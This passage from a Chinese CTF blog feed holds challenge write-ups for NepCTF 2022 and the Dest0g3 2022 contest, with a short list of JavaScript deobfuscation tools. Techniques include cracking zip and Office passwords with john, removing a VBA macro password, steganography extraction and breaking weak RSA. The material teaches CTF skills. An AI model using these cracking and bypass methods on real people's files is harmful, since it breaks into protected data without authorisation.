class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_499630</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [esp+Ch] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+10h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">8</span>]; <span class="comment">// [esp+20h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">2</span>]; <span class="comment">// [esp+44h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">2</span>]; <span class="comment">// [esp+4Ch] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">2</span>]; <span class="comment">// [esp+54h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">2</span>]; <span class="comment">// [esp+5Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">int</span> *)unknown_libname_8((<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *v2 = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = (<span class="type">int</span>)&amp;unk_4A00A0;</span><br><span class="line">  v11[<span class="number">1</span>] = (<span class="type">int</span>)v2;</span><br><span class="line">  fmt_Fscanln((<span class="type">int</span>)&amp;off_4D25B8, dword_54B200, (<span class="type">int</span>)v11, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v4 = (_BYTE *)sub_4479B0((<span class="type">int</span>)v6, *v7, v7[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">23</span>                      <span class="comment">//输入字符串长度满足23</span></span><br><span class="line">    &amp;&amp; *v4 == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">4</span>] == <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">5</span>] == <span class="string">&#x27;F&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">6</span>] == <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">22</span>] == <span class="string">&#x27;&#125;&#x27;</span> )               <span class="comment">//输入字符串满足前缀NepCTF&#123;，后缀满足&#125;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)dword_54B6E4 )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">7</span>) &gt;= <span class="number">0x17</span> )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v4[i + <span class="number">7</span>] != *(_BYTE *)(dword_54B6E0 + i) )     <span class="comment">//将输入和dword_54B6E0比较</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">        v9[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D2334;</span><br><span class="line">        unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v9, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v8[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D233C;</span><br><span class="line">    unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v8, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v10[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D2334;</span><br><span class="line">    unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v10, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i)</code> 比较处下断点动调，查看 <code>dword_54B6E0</code> 存放的值为 <code>U9eT_t0_th3TRUE</code>，故flag为<code>NepCTF&#123;U9eT_t0_th3TRUE&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>菜。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;“NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。&lt;/p&gt;
&lt;p&gt;比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。&lt;/p&gt;
&lt;p&gt;比赛形式：个人解题</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>js混淆</title>
    <link href="https://lazzzaro.github.io/2022/06/03/reverse-js%E6%B7%B7%E6%B7%86/"/>
    <id>https://lazzzaro.github.io/2022/06/03/reverse-js%E6%B7%B7%E6%B7%86/</id>
    <published>2022-06-03T14:38:36.000Z</published>
    <updated>2024-02-27T15:54:16.983Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><h3 id="obfuscator-ob"><a href="#obfuscator-ob" class="headerlink" title="obfuscator / ob"></a>obfuscator / ob</h3><p>混淆后，变量跟方法名已经完全替换，第一行可以看到明显的一个数组。</p><p>特征：移位操作，函数名和变量名通常以 _0x 或者 0x 开头，后接 1~6 位数字或字母组合。</p><p>解混淆：</p><p><a href="https://tool.yuanrenxue.cn/decode_obfuscator">https://tool.yuanrenxue.cn/decode_obfuscator</a></p><p>​    </p><h3 id="packed"><a href="#packed" class="headerlink" title="packed"></a>packed</h3><p>特征：eval后面的function参数类似packed组成（也可能是其他组成）。</p><p>解混淆：</p><p><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://obf-io.deobfuscate.io/">https://obf-io.deobfuscate.io/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;h3 id=&quot;obfuscator-ob&quot;&gt;&lt;a href=&quot;#obfuscator-ob&quot; class=&quot;headerlink&quot; title=&quot;obfuscator / ob&quot;&gt;&lt;/a&gt;obfuscator / ob&lt;/h3&gt;&lt;p&gt;混淆后，变量跟方法</summary>
      
    
    
    
    <category term="reverse" scheme="https://lazzzaro.github.io/categories/reverse/"/>
    
    
    <category term="js" scheme="https://lazzzaro.github.io/tags/js/"/>
    
    <category term="混淆" scheme="https://lazzzaro.github.io/tags/%E6%B7%B7%E6%B7%86/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</id>
    <published>2022-05-26T12:09:18.000Z</published>
    <updated>2022-05-28T14:17:41.878Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。</p><p>比赛时间：2022.5.20 10:00 - 5.27 10:00</p><p>题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain</p><p>题目难度：萌新</p><p>比赛类型：个人赛</p><p>比赛交流QQ群：923945203</p><p>个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个</p><p>Rank: 12</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Welcome-to-fxxking"><a href="#Welcome-to-fxxking" class="headerlink" title="Welcome to fxxking"></a>Welcome to fxxking</h3><blockquote><p>关注公众号并回复：Give me the fxxking flag</p></blockquote><p>公众号 <code>Dest0g3 Team</code> 回复：Give me the fxxking flag，</p><p>得到 <code>The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125;</code></p><p>​    </p><h3 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h3><p>foremost分解png图片得到zip压缩包，zsteg查看png图片的lsb通道得到 <code>Password for zip:Weak_Pas5w0rd</code>；</p><p>用密码 <code>Weak_Pas5w0rd</code> 解压zip压缩包得到flag：<code>Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;</code>。</p><p>​    </p><h3 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h3><blockquote><p>Enjoy Decoding</p></blockquote><p>用ARCHPR爆破zip压缩包密码得到 <code>100861</code>，按照 摩斯密码-16进制-Unicode-Base64 解码得到 <code>Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;</code>。</p><p>​    </p><h3 id="你知道js吗"><a href="#你知道js吗" class="headerlink" title="你知道js吗"></a>你知道js吗</h3><p>打开flag文件发现是word文件/压缩包，在 <code>document.xml</code> 中找到Base64编码的字符串，解码得到brainfuck，<a href="https://www.splitbrain.org/services/ook">在线解密</a>得到16进制字符串 <code>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</code>，转为字符得 <code>Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</code>。</p><p>​    </p><h3 id="StrangeTraffic"><a href="#StrangeTraffic" class="headerlink" title="StrangeTraffic"></a>StrangeTraffic</h3><p>Wireshark打开发现是Modbus流量，在流0发现分段Base64字符串 <code>RGVzdDBnM3</code>、<code>szMUE1QkVB</code>、<code>Ni1GMjBELU</code>、<code>YxOEEtRThF</code>、<code>QS0yOUI0Rj</code>、<code>I1NzEwOEJ9</code>，连接解码得 <code>Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;</code>。</p><p>​    </p><h3 id="EasyWord"><a href="#EasyWord" class="headerlink" title="EasyWord"></a>EasyWord</h3><blockquote><p>Let the word tell u</p></blockquote><p>根据 <code>hint.txt</code> 得知 <code>password.docm</code> 密码全小写字母，且满足 <code>??q?b?</code>，用john爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">office2john password.docm &gt; hash.txt</span><br><span class="line">john --mask=<span class="string">&#x27;?l?lq?lb?l&#x27;</span> hash.txt</span><br></pre></td></tr></table></figure><p>得到密码 <code>ulqsbt</code>；</p><p>打开发现存在宏，查看宏代码有密码，参考<a href="https://blog.csdn.net/qq_44768749/article/details/102673212">类似题目</a>中破解宏密码的方法，将word文件用压缩包方式打开，找到 <code>vbaProject.bin</code> 文件以16进制方式查看，将 <code>DBP</code> 改为 <code>DBX</code> 并保存，再将修改后的文件替换到压缩包里，改回word文件格式，重新打开可看到宏代码。</p><p>进入VBA编辑器查看Dialog对应宏代码：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> CB_OK_Click()</span><br><span class="line"><span class="keyword">Dim</span> strpasw <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strdec <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strusrinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">t = ChrW(<span class="number">21152</span>) &amp; ChrW(<span class="number">27833</span>) &amp; ChrW(<span class="number">21543</span>) &amp; ChrW(<span class="number">65292</span>) &amp; ChrW(<span class="number">21516</span>) &amp; ChrW(<span class="number">23398</span>) &amp; ChrW(<span class="number">20204</span>) &amp; ChrW(<span class="number">65281</span>)</span><br><span class="line"></span><br><span class="line">strusrinput = Dialog.TextBox_Pasw</span><br><span class="line"><span class="keyword">Dim</span> sinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">sinput = strusrinput</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> (strusrinput &lt;&gt; <span class="string">&quot;&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">  strusout = Encode(strusrinput, t)</span><br><span class="line">  <span class="keyword">If</span> (strusout = <span class="string">&quot;┤℡ǒqｘ~&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">      strdec = Decode(Dialog.Label_ls.Caption, sinput)</span><br><span class="line">  <span class="keyword">Else</span></span><br><span class="line">     <span class="keyword">If</span> (strusout = <span class="string">&quot;ｋGJEｇｑ&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">        strdec = Decode(Dialog.Label_ls1.Caption, sinput)</span><br><span class="line">     <span class="keyword">Else</span></span><br><span class="line">          <span class="keyword">If</span> (strusout = <span class="string">&quot;ЮΟopz+&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">             strdec = Decode(Dialog.Label_ls2.Caption, sinput)</span><br><span class="line">          <span class="keyword">Else</span></span><br><span class="line">                <span class="keyword">If</span> (strusout = <span class="string">&quot;ｚΚjrШφεあ&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)</span><br><span class="line">                <span class="keyword">Else</span></span><br><span class="line">                    <span class="keyword">If</span> (strusout = <span class="string">&quot;àǖtＵｗ┧ｈè&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)</span><br><span class="line">                    <span class="keyword">Else</span></span><br><span class="line">                          strdec = StrConv(t, vbFromUnicode)</span><br><span class="line">                    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">                <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">           <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   Label_CLUE.Caption = strdec</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>无需分析加解密算法，输出结果 <code>strusout</code> 由 <code>Encode(strusrinput, t)</code> 加密得到，只需分别用解密函数反推五个if分支条件对应的明文即可，修改 <code>Label_CLUE.Caption = strdec</code> 为 <code>Label_CLUE.Caption = Decode(xxx,t)</code>，回到word运行 <code>AutoOpen</code> 宏，随便输入字符点击确定即可在Dialog的label处显示对应明文，分别是 <code>123456</code>、<code>aaaaaa</code>、<code>000000</code>、<code>墙角数枝</code>、<code>iloveyou</code>；</p><p>将 <code>Label_CLUE.Caption = Decode(xxx,t)</code> 改回 <code>Label_CLUE.Caption = strdec</code>，分别输入五段明文，发现输入 <code>墙角数枝</code> 得到 <code>解压密码：两只黄鹂鸣翠柳,一行白鹭上青天!</code>，结合word里的hint <code>Rar密码为复杂型，长度为16位，包含了字母、数字和符号。</code>，压缩包密码猜出为 <code>2zhlmcl,1hblsqt.</code>，解压拿到flag：<code>Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</code>。</p><p>​    </p><h3 id="4096"><a href="#4096" class="headerlink" title="4096"></a>4096</h3><blockquote><p>Just relax and always be aware of the changes on the web!</p></blockquote><p>4096小游戏，查看js，用chrome源代码里的搜索功能，搜 <code>flag</code> 可在 <code>local_storage_manager.js</code> 里找到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPartFlag</span>(<span class="params">score</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (score &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次base64解码得到flag后半部分 <code>4ee7-b673-971d81f8b177&#125;</code>。</p><p>前半部分在js内找很久都没找到，观察资源文件里存在 <code>favicon.ico</code> 和 <code>favicon.png</code> 两张图，取出来发现png图有隐写，foremost分出一个wav文件和一个zip文件；</p><p>用audacity查看wav，前后两段是DTMF按键音，解码出 <code>74958097831</code>，中间一段是SSTV慢扫描电视，用robot36扫出图片，内容是 <code>MD5&#123;cell phone number&#125;</code>，将前面的 <code>74958097831</code> 倒序成手机号格式，MD5加密得到 <code>32fc1b5487cb447f792a19418b92544e</code>，解压zip压缩包；</p><p>压缩包里为切割后打乱拼接的图片，利用gaps工具拼图</p><p><code>gaps --image=puzzle.png --size=64 --save</code></p><p>得到的结果还是有部分块位置不对，再gaps两次得到完整原图：</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/part_flag_solution_solution_solution.jpg" alt="part_flag_solution_solution_solution" style="zoom:50%;"></p><p>将字符串拼接得 <code>RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==</code>，base64解码得flag前半段：<code>Dest0g3&#123;ed4d114f-9ee4-</code>。</p><p>​    </p><h3 id="Python-jail"><a href="#Python-jail" class="headerlink" title="Python_jail"></a>Python_jail</h3><blockquote><p>听说python是最好的语言，那我把它锁起来，我就是最好的语言了！</p></blockquote><p>根据hint提示，password里内容是whitespace语言，<a href="https://ideone.com/NUNNbI">在线编译</a>得到 <code>a8e15220-7404-4269-812e-6418557b7dc2</code>，是zip压缩包密码；</p><p>解压zip压缩包，zsteg发现lsb隐写pyc文件，提取：</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc</code></p><p>无需反编译，16进制查看发现 <code>ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9</code>，base64解码得 <code>flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</code>。</p><p>​    </p><h3 id="codegame"><a href="#codegame" class="headerlink" title="codegame"></a>codegame</h3><blockquote><p>Funny and ez codegame with Key to celebrate EDG</p></blockquote><p>KEYcode里经查是LOLCODE Language，用dcode解得到输出是 <code>QEFPFPQEBMXPPTLOA</code>，以此为密码解压zip压缩包，得到word文件；</p><p>直接打开word发现 <code>AES</code> 提示，用压缩包打开word有个 <code>fllllllllll1ag.txt</code> 文件，里面是一串emoji表情，猜想为emoji-aes加密，<a href="https://aghorler.github.io/emoji-aes/">在线解密</a>，同样用 <code>QEFPFPQEBMXPPTLOA</code> 作为key，没成功，再不断盲调Rotation，在Rotation为4的时候解密成功，得到</p><p><code>666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D</code></p><p>16进制转字符串得 <code>flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;</code>。</p><p>​    </p><h3 id="rookie-hacker-2"><a href="#rookie-hacker-2" class="headerlink" title="rookie hacker-2"></a>rookie hacker-2</h3><blockquote><p>（容器1的容器名为 <code>test_docker1</code>，容器2的容器名为 <code>test_docker2</code>）</p><p>Alice访问自己的docker时忘记了把容器分别部署在哪些ip上，你能帮帮他么？ Flag格式：Dest0g3{ip1_ip2_…..} 例：假设容器1、容器2的ip为1.1.1.1、2.2.2.2，则flag为 Dest0g3{1.1.1.1_2.2.2.2}</p></blockquote><p>非预期，docker的IP地址会以 <code>&quot;IPAddress&quot;: &quot;172.x.x.x&quot;</code> 的形式记录在配置文件中，直接在E01文件里用正则表达式 <code>&quot;IPAddress&quot;:&quot;172</code> 搜索，取出现频率最高的两个IP即可，flag：<code>Dest0g3&#123;172.18.0.2_172.18.0.3&#125;</code>。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line"><span class="string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ 相近，常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">p = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>AES-CBC解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 